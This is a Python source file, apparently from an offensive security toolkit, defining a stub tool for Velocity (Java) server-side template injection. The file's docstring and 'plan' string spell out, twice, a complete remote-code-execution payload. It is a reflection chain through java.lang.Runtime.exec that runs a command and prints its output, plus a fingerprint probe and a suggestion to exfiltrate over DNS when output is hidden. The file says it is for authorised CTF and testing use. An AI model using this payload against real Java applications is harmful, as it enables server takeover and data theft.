"""Velocity SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: #set($x=7*7)${x}→49。
RCE 反射链($s.class 即 getClass()): #set($s="") #set($rt=$s.class.forName("java.lang.Runtime")) #set($ex=$rt.getRuntime().exec(cmd)) $ex.waitFor() #set($out=$ex.getInputStream()) #set($str=$s.class.forName("java.lang.String")) #set($chr=$s.class.forName("java.lang.Character")) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
无回显场景可改 DNS 外带。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiVelocityTool(SstiEngineTool):
    name = "ssti_velocity"
    description = "Velocity(Java) SSTI:反射链 Runtime.exec + Character 逐字节回显(占位符)"
    engine_key = "velocity"
    engine_name = "Velocity"
    default_mode = "exec"
    plan = r"""指纹: #set($x=7*7)${x}→49。
RCE 反射链($s.class 即 getClass()): #set($s="") #set($rt=$s.class.forName("java.lang.Runtime")) #set($ex=$rt.getRuntime().exec(cmd)) $ex.waitFor() #set($out=$ex.getInputStream()) #set($str=$s.class.forName("java.lang.String")) #set($chr=$s.class.forName("java.lang.Character")) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
无回显场景可改 DNS 外带。"""
